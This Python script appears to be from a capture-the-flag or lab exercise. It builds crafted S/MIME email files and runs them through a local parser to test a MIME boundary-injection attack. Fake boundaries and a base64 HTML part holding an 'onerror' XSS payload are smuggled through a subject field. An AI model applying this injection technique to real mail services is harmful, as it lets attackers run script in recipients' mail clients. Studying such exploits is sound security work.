import os, subprocess, base64

OUT = r"./_z_496_emls"
os.makedirs(OUT, exist_ok=True)

def run(name, data):
    p = os.path.join(OUT, name + ".eml")
    with open(p, "w", newline="", encoding="utf-8") as f:
        f.write(data)
    wp = "./_z_496_emls/" + name + ".eml"
    r = subprocess.run(["wsl", "-d", "kali-linux", "--", "bash", "-lc",
                        "node ./_z_496_parse.js " + wp],
                       capture_output=True, text=True)
    print("====", name, "rc", r.returncode)
    print(r.stdout.strip()[:1200])
    if r.returncode != 0:
        print("err:", r.stderr.strip()[:600])

B = "===============12345=="
PWN = '<img src=x onerror="alert(1)">'
b64 = base64.b64encode(PWN.encode()).decode()

# inner signed content, as smail builds it, with injection from the title
payload = ('<!DOCTYPE html><html><body><h1>Re: '
           '\n--' + B + ' \nContent-Type : text/html\nContent-Transfer-Encoding : base64\n\n' + b64 + '\n--' + B + '-- '
           '</h1></body></html>')

inner = ('Content-Type: multipart/mixed; boundary="' + B + '"\n'
         'MIME-Version: 1.0\n'
         '\n'
         '--' + B + '\n'
         'Content-Type: text/plain; charset="us-ascii"\n'
         'MIME-Version: 1.0\n'
         'Content-Transfer-Encoding: 7bit\n'
         '\n' + payload + '\n'
         '--' + B + '\n'
         'Content-Type: text/html; charset="us-ascii"\n'
         'MIME-Version: 1.0\n'
         'Content-Transfer-Encoding: 7bit\n'
         '\n' + payload + '\n'
         '--' + B + '--\n')

B2 = "===============999=="
outer = ('Content-Type: multipart/signed; protocol="application/pkcs7-signature"; micalg="sha-256"; boundary="' + B2 + '"\n'
         'MIME-Version: 1.0\n'
         'From: admin@ses\n'
         'To: admin@ses\n'
         'Subject: Re: Hello\n'
         'From :admin@ses\n'
         'Content-Type : text/html\n'
         '\n'
         'BASE64STUFF\n'
         '--' + B + '-- \n'
         '\n'
         'This is an S/MIME signed message\n'
         '\n'
         '--' + B2 + '\n' + inner + '\n'
         '--' + B2 + '\n'
         'Content-Type: application/pkcs7-signature; name="smime.p7s"\n'
         'Content-Transfer-Encoding: base64\n'
         '\n'
         'AAAA\n'
         '--' + B2 + '--\n')

# parse of the signed content alone (what openssl would output)
run("inner_only", inner)
run("outer_full", outer)
